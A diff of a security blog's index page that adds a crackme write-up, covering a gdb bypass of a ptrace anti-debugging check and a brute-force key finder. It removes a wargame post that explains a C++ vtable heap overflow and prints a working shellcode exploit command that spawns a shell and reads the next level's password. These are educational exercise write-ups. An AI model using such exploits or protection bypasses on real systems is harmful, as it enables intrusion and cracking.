@@ -36,7 +36,7 @@
 </head>
 
 
-  <body>
+  <body class="theme-base-0d">
 
     <div class="sidebar">
   <div class="container sidebar-sticky">
@@ -62,16 +62,20 @@
       
         
           
-            <a class="sidebar-nav-item" href="/about.html">About</a>
+            <a class="sidebar-nav-item" href="/about">About</a>
           
         
       
         
           
-            <a class="sidebar-nav-item" href="/archive.html">Archive</a>
+            <a class="sidebar-nav-item" href="/archive">Archive</a>
           
         
       
+        
+      
+        
+          
         
       
         
@@ -98,13 +102,180 @@
       <a class="sidebar-nav-item" href="https://github.com/alvarofe">GitHub</a>
     </nav>
 
-    <p>&copy; 2015. All rights reserved.</p>
+    <p>&copy; 2016. All rights reserved.</p>
   </div>
 </div>
 
 
     <div class="content container">
       <div class="posts">
+  
+  <div class="post">
+    <h1 class="post-title">
+      <a href="/posts/qcrk5crackme">
+        Defeating qcrk5 crackme
+      </a>
+    </h1>
+
+    <span class="post-date">25 Feb 2015</span>
+
+    <p>Today I am going to write up about how I resolved this <a href="http://crackmes.de/users/qnix/qcrk5/">crackme</a>. The level of this crackme is easy so it should not be difficult for those with the minimum of knowledge about reversing. This crackme like the majority of them ask for a password that we have to extract it, to bypass the check and win the flag.</p>
+
+<p>The first task when we face against these challenges is to know the maximum about the binary. Basically the gather information phase.</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">➜  crackmes  file qcrk5
+qcrk5: ELF 32-bit LSB executable, Intel 80386, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, <span class="k">for</span> GNU/Linux 2.4.1, stripped
+</code></pre></div>
+<p>It is a ELF-binary and is statically linked. So far, so good. Now we run strace to look for example what kind of syscall is doing.</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="err">➜</span>  <span class="n">crackmes</span>  <span class="n">strace</span> <span class="p">.</span><span class="o">/</span><span class="n">qcrk5</span> <span class="mi">1234</span>
+<span class="n">execve</span><span class="p">(</span><span class="s">&quot;./qcrk5&quot;</span><span class="p">,</span> <span class="p">[</span><span class="s">&quot;./qcrk5&quot;</span><span class="p">,</span> <span class="s">&quot;1234&quot;</span><span class="p">],</span> <span class="p">[</span><span class="cm">/* 34 vars */</span><span class="p">])</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="p">[</span> <span class="n">Process</span> <span class="n">PID</span><span class="o">=</span><span class="mi">3869</span> <span class="n">runs</span> <span class="n">in</span> <span class="mi">32</span> <span class="n">bit</span> <span class="n">mode</span><span class="p">.</span> <span class="p">]</span>
+<span class="n">uname</span><span class="p">({</span><span class="n">sys</span><span class="o">=</span><span class="s">&quot;Linux&quot;</span><span class="p">,</span> <span class="n">node</span><span class="o">=</span><span class="s">&quot;alvaro-debian&quot;</span><span class="p">,</span> <span class="p">...})</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">brk</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                                  <span class="o">=</span> <span class="mh">0x87fe000</span>
+<span class="n">brk</span><span class="p">(</span><span class="mh">0x881f000</span><span class="p">)</span>                          <span class="o">=</span> <span class="mh">0x881f000</span>
+<span class="n">open</span><span class="p">(</span><span class="s">&quot;/dev/urandom&quot;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">)</span>          <span class="o">=</span> <span class="mi">3</span>
+<span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\277</span><span class="s">Y</span><span class="se">\307</span><span class="s">X&quot;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>                <span class="o">=</span> <span class="mi">4</span>
+<span class="n">close</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>                                <span class="o">=</span> <span class="mi">0</span>
+<span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>       <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="n">EPERM</span> <span class="p">(</span><span class="n">Operation</span> <span class="n">not</span> <span class="n">permitted</span><span class="p">)</span>
+<span class="n">exit_group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                           <span class="o">=</span> <span class="o">?</span>
+</code></pre></div>
+<p>It has anti-debugging trick embedded inside the program. So is presumably that when we run the binary using gdb the same thing happens.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ r 1234
+[Inferior 1 (process 3939) exited with code 01]
+</code></pre></div>
+<p>But with gdb we can bypass the ptrace syscall always returning the good value and that can be achieved writting in .gdbinit the following.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">catch syscall ptrace
+commands 1
+set ($eax) = 0
+continue
+end
+</code></pre></div>
+<p>Basically we are going to set up a <a href="https://sourceware.org/gdb/current/onlinedocs/gdb/Set-Catchpoints.html#Set-Catchpoints">catchpoint</a> each time that ptrace is called. Then using <code>commands 1</code> we are saying that each time that the breakpoint with value 1 (that is gonna be the catchpoint) is hit, we set <code>eax</code> to 0 and then continue the execution. Basically each time that ptrace is called is gonna return 0. Thanks to that, we are going to bypass the ptrace check and it lets us debug our binary. We could also bypass the ptrace check using <code>LD_PRELOAD</code> hooking a ptrace call and so on but this one is more easy and quickly to accomplish.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ r 1234
+
+Catchpoint 1 (returned from syscall ptrace), 0x0804ea76 in ?? ()
+Using 1234
+Wrong!
+[Inferior 1 (process 4011) exited normally]
+</code></pre></div>
+<p>It&#39;s time to dive in the binary to know what is going on in the main function. You can use either radare2 or Hopper to resolve it. I am going to use both. </p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">➜  crackmes  r2 qcrk5
+ -- bash: r3: command not found
+[0x08048110]&gt; aa
+Function too big at 0x809824c
+[0x08048110]&gt; afl
+0x08048110  34  1  entry0
+0x08048340  753  45  fcn.08048340
+...
+0x080503a3  235  19  fcn.080503a3
+0x08048134  33  3  fcn.08048134
+0x08048160  68  8  fcn.08048160
+0x080481a4  99  6  fcn.080481a4
+0x08048208  306  8  main
+</code></pre></div>
+<p>The main function is located at <code>0x08048208</code> so let&#39;s go ahead and disassemble it.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">[0x08048110]&gt; pdf@main
+/ (fcn) main 306
+|          ; var int local_8 @ ebp-0x8
+|          ; var int local_4 @ ebp-0x4
+|          ; var int local_14 @ ebp-0x14
+|          ; arg int arg_4b7f3da0 @ ebp+0x4b7f3da0
+|          ; arg int arg_8 @ ebp+0x8
+|          ; arg int arg_c @ ebp+0xc
+|          ; DATA XREF from 0x08048127 (entry0)
+|          ; DATA XREF from 0x00000127 (fcn.0000010b)
+|          ;-- main:
+|          0x08048208    55           push ebp
+|          0x08048209    89e5         mov ebp, esp
+|          0x0804820b    83ec28       sub esp, 0x28
+|          0x0804820e    83e4f0       and esp, 0xfffffff0
+|          0x08048211    b800000000   mov eax, 0
+|          0x08048216    83c00f       add eax, 0xf
+|          0x08048219    83c00f       add eax, 0xf
+
+...
+</code></pre></div>
+<p>The output is quite long and I am not going to write it. But for example in <code>0x0804824a</code> it calls a function passing four paramaters <code>0,0,1,0</code> and if <code>eax</code> is less than 0 the function returns. This is basically the ptrace call that stop us to debug the binary. Now I am going to use Hopper since it provides a decompiler that make the work easier for us.</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">arg0</span><span class="p">,</span> <span class="kt">int</span> <span class="n">arg1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">arg2</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">esp</span> <span class="o">=</span> <span class="p">(</span><span class="n">esp</span> <span class="o">&amp;</span> <span class="mh">0xfffffff0</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x1e</span> <span class="o">&gt;&gt;</span> <span class="mh">0x4</span> <span class="o">&lt;&lt;</span> <span class="mh">0x4</span><span class="p">);</span>
+    <span class="n">var_4</span> <span class="o">=</span> <span class="mh">0x4b7f3da0</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">sub_804ea50</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">var_14</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">arg_0</span> <span class="o">!=</span> <span class="mh">0x2</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="n">eax</span> <span class="o">=</span> <span class="o">*</span><span class="n">arg_4</span><span class="p">;</span>
+                    <span class="n">sub_8049530</span><span class="p">(</span><span class="o">*</span><span class="mh">0x80af3b4</span><span class="p">,</span> <span class="s">&quot;Usage : %s &lt;password&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">eax</span><span class="p">);</span>
+                    <span class="n">sub_8048c10</span><span class="p">(</span><span class="mh">0x0</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="n">var_8</span> <span class="o">=</span> <span class="n">sub_08048b30</span><span class="p">();</span>
+            <span class="o">*</span><span class="n">var_8</span> <span class="o">=</span> <span class="o">*</span><span class="n">var_8</span> <span class="o">+</span> <span class="mh">0x5</span><span class="p">;</span>
+            <span class="o">*</span><span class="n">var_8</span> <span class="o">=</span> <span class="o">*</span><span class="n">var_8</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">;</span>
+            <span class="n">var_8</span> <span class="o">=</span> <span class="p">(</span><span class="n">var_8</span> <span class="o">&lt;&lt;</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">-</span> <span class="n">var_8</span><span class="p">;</span>
+            <span class="n">var_8</span> <span class="o">=</span> <span class="n">var_8</span> <span class="o">*</span> <span class="mh">0x909090</span><span class="p">;</span>
+            <span class="n">eax</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">arg_4</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">);</span>
+            <span class="n">sub_8049530</span><span class="p">(</span><span class="o">*</span><span class="mh">0x80af3b4</span><span class="p">,</span> <span class="s">&quot;Using %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">eax</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">var_4</span> <span class="o">==</span> <span class="n">var_8</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="n">eax</span> <span class="o">=</span> <span class="o">*</span><span class="mh">0x80af3b4</span><span class="p">;</span>
+                    <span class="n">sub_8049530</span><span class="p">(</span><span class="n">STK33</span><span class="p">,</span> <span class="n">eax</span><span class="p">,</span> <span class="s">&quot;Correct, Cracked !!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+                    <span class="n">sub_8048c10</span><span class="p">(</span><span class="mh">0x0</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="n">eax</span> <span class="o">=</span> <span class="o">*</span><span class="mh">0x80af3b4</span><span class="p">;</span>
+            <span class="n">sub_8049530</span><span class="p">(</span><span class="n">STK33</span><span class="p">,</span> <span class="n">eax</span><span class="p">,</span> <span class="s">&quot;Wrong!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+            <span class="n">sub_8048c10</span><span class="p">(</span><span class="mh">0x0</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">eax</span> <span class="o">=</span> <span class="n">var_14</span><span class="p">;</span>
+    <span class="k">return</span> <span class="n">eax</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>We have to achieve that <code>var_8</code> be equal to <code>0x4b7f3da0</code>. We should know what returns <code>sub_08048b30()</code>. To know that, our best friend as always is gdb.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ b *0x08048208
+Breakpoint 2 at 0x8048208
+gdb-peda$ r 16
+
+/******  
+0x804829c:   call   0x8048be0
+0x80482a1:   mov    DWORD PTR [ebp-0x8],eax
+*******/
+gdb-peda$ b *0x80482a1
+Breakpoint 3 at 0x80482a1
+gdb-peda$ c
+gdb-peda$ p $eax
+$1 = 0x10
+</code></pre></div>
+<p>So <code>var_8</code> is equal to argv[1]. <code>sub_08048b30()</code> must be <code>atoi</code> or other similar function.</p>
+<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include&lt;stdio.h&gt;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">var8</span><span class="p">,</span><span class="n">temp</span><span class="p">,</span><span class="n">i</span><span class="p">;</span>
+
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0xffffffff</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">var8</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mh">0x5</span><span class="p">;</span>
+    <span class="n">var8</span> <span class="o">=</span> <span class="n">var8</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">;</span>
+    <span class="n">temp</span> <span class="o">=</span> <span class="n">var8</span><span class="p">;</span>
+    <span class="n">var8</span> <span class="o">=</span> <span class="p">(</span> <span class="n">var8</span> <span class="o">&lt;&lt;</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">-</span> <span class="n">temp</span><span class="p">;</span>
+    <span class="n">var8</span> <span class="o">=</span> <span class="n">var8</span> <span class="o">*</span> <span class="mh">0x909090</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span> <span class="n">var8</span> <span class="o">==</span> <span class="mh">0x4b7f3da0</span><span class="p">){</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Key found %u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+      <span class="k">return</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><div class="highlight"><pre><code class="language-text" data-lang="text">➜  /tmp  make pass
+cc     pass.c   -o pass
+➜  /tmp  ./pass
+Key found 91867153
+➜  crackmes  ./qcrk5  91867153
+Using 91867153
+Correct, Cracked !!
+</code></pre></div>
+<p>If you liked this post, you can
+<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/qcrk5crackme&text=Defeating qcrk5 crackme&via=alvaro_fe">share it with your followers</a>
+or
+<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
+
+  </div>
   
   <div class="post">
     <h1 class="post-title">
@@ -160,147 +331,6 @@
 
 <p>If you liked this post, you can
 <a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/TLS&text=TLS and PKI&via=alvaro_fe">share it with your followers</a>
-or
-<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
-
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="/posts/level08smash">
-        Level 08 I/O Smash the Stack
-      </a>
-    </h1>
-
-    <span class="post-date">09 Feb 2015</span>
-
-    <p>Finally I got some time to write. I am going to try to summarize the process which I have had to pass to resolve the smash&#39;s level08.</p>
-
-<p>The code for this exercise is the following.</p>
-<div class="highlight"><pre><code class="language-C++" data-lang="C++"> <span class="c1">// writen by bla for io.smashthestack.org</span>
-<span class="cp">#include &lt;iostream&gt;</span>
-<span class="cp">#include &lt;cstring&gt;</span>
-<span class="cp">#include &lt;unistd.h&gt;</span>
-
-<span class="k">class</span> <span class="nc">Number</span>
-<span class="p">{</span>
-        <span class="k">public</span><span class="o">:</span>
-                <span class="n">Number</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">)</span> <span class="o">:</span> <span class="n">number</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="p">{}</span>
-                <span class="kt">void</span> <span class="n">setAnnotation</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">)</span> <span class="p">{</span><span class="n">memcpy</span><span class="p">(</span><span class="n">annotation</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">a</span><span class="p">));}</span>
-                <span class="k">virtual</span> <span class="kt">int</span> <span class="k">operator</span><span class="o">+</span><span class="p">(</span><span class="n">Number</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="n">number</span> <span class="o">+</span> <span class="n">r</span><span class="p">.</span><span class="n">number</span><span class="p">;}</span>
-        <span class="k">private</span><span class="o">:</span>
-                <span class="kt">char</span> <span class="n">annotation</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
-                <span class="kt">int</span> <span class="n">number</span><span class="p">;</span>
-<span class="p">};</span>
-
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-<span class="p">{</span>
-        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-
-        <span class="n">Number</span> <span class="o">*</span><span class="n">x</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Number</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
-        <span class="n">Number</span> <span class="o">*</span><span class="n">y</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Number</span><span class="p">(</span><span class="mi">6</span><span class="p">);</span>
-        <span class="n">Number</span> <span class="o">&amp;</span><span class="n">five</span> <span class="o">=</span> <span class="o">*</span><span class="n">x</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">six</span> <span class="o">=</span> <span class="o">*</span><span class="n">y</span><span class="p">;</span>
-
-        <span class="n">five</span><span class="p">.</span><span class="n">setAnnotation</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-
-        <span class="k">return</span> <span class="n">six</span> <span class="o">+</span> <span class="n">five</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div>
-<p>It is clear how the use of <code>memcpy</code> is insecure due to there is not sanitation on the argv[1] so we can write beyond the capacity of the member variable <code>annotation</code>.</p>
-
-<p>To see if this fact is exploitable we need to figure out how is the layout of the class on memory. C++ classes are very similar with C’s structs. That means that the layout would be.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">AAAAAAAAAAAAAAAAAAAANNNN
-
-where:
-A -&gt; bytes of annotation
-N -&gt; bytes of number
-</code></pre></div>
-<p>But in this case we have an extra pointer which is normally known as <code>vtable</code>. So the layout would be as follows.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">PPPPAAAAAAAAAAAANNNN
-where:
-P-&gt; pointer of vtable
-A-&gt; bytes of annotation
-N-&gt; bytes of number
-</code></pre></div>
-<p>What is the goal of vtable in C++? This can be viewed as dynamic binding since is the way C++ resolve calls when the inheritances come out. The following <a href="http://phrack.org/issues/56/8.html">example</a>  try to explain the concept.</p>
-<div class="highlight"><pre><code class="language-C++" data-lang="C++"><span class="cp">#include &lt;stdio.h&gt;</span>
-<span class="cp">#include &lt;string.h&gt;</span>
-
-<span class="k">class</span> <span class="nc">BaseClass</span>
-<span class="p">{</span>
-    <span class="k">private</span><span class="o">:</span>
-        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
-    <span class="k">public</span><span class="o">:</span>
-        <span class="kt">void</span> <span class="n">SetBuffer</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">String</span><span class="p">)</span>
-        <span class="p">{</span>
-            <span class="n">strcpy</span><span class="p">(</span><span class="n">Buffer</span><span class="p">,</span><span class="n">String</span><span class="p">);</span>
-        <span class="p">}</span>
-        <span class="k">virtual</span> <span class="kt">void</span> <span class="n">PrintBuffer</span><span class="p">()</span>
-        <span class="p">{</span>
-            <span class="n">printf</span><span class="p">(</span><span class="err">“</span><span class="o">%</span><span class="n">s</span><span class="err">\</span><span class="n">n</span><span class="err">”</span><span class="p">,</span><span class="n">Buffer</span><span class="p">);</span>
-        <span class="p">}</span>
-<span class="p">};</span>
-
-<span class="k">class</span> <span class="nc">MyClass1</span><span class="o">:</span><span class="k">public</span> <span class="n">BaseClass</span>
-<span class="p">{</span>
-    <span class="k">public</span><span class="o">:</span>
-        <span class="kt">void</span> <span class="n">PrintBuffer</span><span class="p">()</span>
-        <span class="p">{</span>
-            <span class="n">printf</span><span class="p">(</span><span class="err">“</span><span class="nl">MyClass1</span><span class="p">:</span> <span class="err">“</span><span class="p">);</span>
-            <span class="n">BaseClass</span><span class="o">::</span><span class="n">PrintBuffer</span><span class="p">();</span>
-        <span class="p">}</span>
-<span class="p">};</span>
-
-<span class="k">class</span> <span class="nc">MyClass2</span><span class="o">:</span><span class="k">public</span> <span class="n">BaseClass</span>
-<span class="p">{</span>
-    <span class="k">public</span><span class="o">:</span>
-        <span class="kt">void</span> <span class="n">PrintBuffer</span><span class="p">()</span>
-        <span class="p">{</span>
-            <span class="n">printf</span><span class="p">(</span><span class="err">“</span><span class="nl">MyClass2</span><span class="p">:</span> <span class="err">“</span><span class="p">);</span>
-            <span class="n">BaseClass</span><span class="o">::</span><span class="n">PrintBuffer</span><span class="p">();</span>
-        <span class="p">}</span>
-<span class="p">};</span>
-
-<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="n">BaseClass</span> <span class="o">*</span><span class="n">Object</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
-
-    <span class="n">Object</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MyClass1</span><span class="p">;</span>
-    <span class="n">Object</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MyClass2</span><span class="p">;</span> 
-
-    <span class="n">Object</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">SetBuffer</span><span class="p">(</span><span class="err">“</span><span class="n">string1</span><span class="err">”</span><span class="p">);</span>
-    <span class="n">Object</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">SetBuffer</span><span class="p">(</span><span class="err">“</span><span class="n">string2</span><span class="err">”</span><span class="p">);</span>
-    <span class="n">Object</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">PrintBuffer</span><span class="p">();</span>
-    <span class="n">Object</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">PrintBuffer</span><span class="p">();</span>
-<span class="p">}</span>
-
-<span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">example</span>
-<span class="nl">MyClass1</span><span class="p">:</span> <span class="n">string1</span>
-<span class="nl">MyClass2</span><span class="p">:</span> <span class="n">string2</span>
-</code></pre></div>
-<p>What’s going on here? Thanks to vtable the runtime can resolve which method should call. Vtable how we have said before has been created to support dynamic binding or dynamic dispatch. It is an array of functions. This functions will be set at runtime to point to the correct function to be called. That is why the Object[0] knows that when it needs to call the member function <code>PrintBuffer</code>, it must call the MyClass1’s function instead of BaseClass’s. The same happens with Object[1].</p>
-
-<p>If in somehow we can overwrite the vtable we can hijack the flow of our program to execute arbitrary code. That is the problem of the code that we showed at the beginning. </p>
-
-<p>When we call <code>setAnnotation</code> on <code>five</code>, which is a reference to <code>x</code>, we are able to write beyond its space since we are using memcpy without sanitation. We overwrite <code>six</code> memory space, since it is after the five’s memory; with the consequence to overwrite vtable. After that, when the statement <code>return six + five</code> is called, that in reality is called <code>return six.operator+(five)</code>, the runtime look through the <code>vtable</code> to know the correct function to call. This is when the buffer overflow; that happens on the heap since the classes are created using <code>new</code>, can be exploited.</p>
-
-<p>If we use gdb we can see the layout of the memory.</p>
-
-<p><img src="/public/images/level8-1.png" alt="level8-1"></p>
-
-<p>We have to write our shellcode in <code>annotation</code> and then rewrite the six’s vtable to redirect it to our shellcode. Finally to exploit this we need to execute the following.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">/levels/level08 <span class="sb">`</span>perl -e ‘print “<span class="se">\x</span>10<span class="se">\x</span>a0<span class="se">\x</span>04<span class="se">\x</span>08<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>89<span class="se">\x</span>d8<span class="se">\x</span>b0<span class="se">\x</span>17<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>89<span class="se">\x</span>d8<span class="se">\x</span>b0<span class="se">\x</span>2e<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>50<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span>cd<span class="se">\x</span>80”,”A”x56,”<span class="se">\x</span>0c<span class="se">\x</span>a0<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="sb">`</span>
-
-sh-4.2<span class="nv">$ </span>id
-<span class="nv">uid</span><span class="o">=</span>1008<span class="o">(</span>level8<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1008<span class="o">(</span>level8<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1009<span class="o">(</span>level9<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1009<span class="o">(</span>level9<span class="o">)</span>,1008<span class="o">(</span>level8<span class="o">)</span>,1029<span class="o">(</span>nosu<span class="o">)</span>
-sh-4.2<span class="nv">$ </span>cat /home/level9/.pass
-XXXXXXXXXXX
-</code></pre></div>
-<p>Write a shellcode is a difficult task in which I have to go deeper. This exercise has been very helpful to understand the danger of vtable on C++ and how the classes are represented in memory. We must be careful when we develop software since you never know where the danger resides.</p>
-
-<p>If you liked this post, you can
-<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/level08smash&text=Level 08 I/O Smash the Stack&via=alvaro_fe">share it with your followers</a>
 or
 <a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
 
